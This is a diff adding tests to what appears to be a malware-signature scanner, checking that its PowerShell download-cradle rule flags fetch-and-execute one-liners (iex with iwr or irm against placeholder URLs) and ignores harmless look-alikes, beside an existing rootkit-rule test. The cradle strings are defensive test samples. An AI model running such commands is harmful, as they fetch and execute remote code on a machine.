@@ -427,3 +427,16 @@ def test_linux_rootkit_rule_ignores_generic_hide_helpers(ctx):
     rule = {r.id: r for r in ctx.signatures.rules}["AEG-NIX-ROOTKIT"]
     assert rule.match(b"def hide_file(path):\n    SetFileAttributes(path, HIDDEN)\nclass Reptile: pass") is None
     assert rule.match(b'static const char* process_to_filter = "miner"; readdir dlsym') is not None
+
+
+@pytest.mark.parametrize("text,cradle", [
+    (b"iex (iwr http://x/a -UseBasicParsing).Content", True),
+    (b"iex(irm $u)", True),
+    (b"iwr -useb https://get.example | iex", True),
+    # pygments' PowerShell lexer alias table (found by the real-Windows CI deep scan)
+    (b"iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr", False),
+    (b"Read-Host 'please confirm' | iex", False),
+])
+def test_cradle_requires_an_actual_fetch(text, cradle):
+    ids = {i.rule_id for i in fa.content_indicators(text, "script")}
+    assert bool(ids & {"AEG-H-SCR-CRADLE", "AEG-H-SCR-CRADLE2"}) is cradle
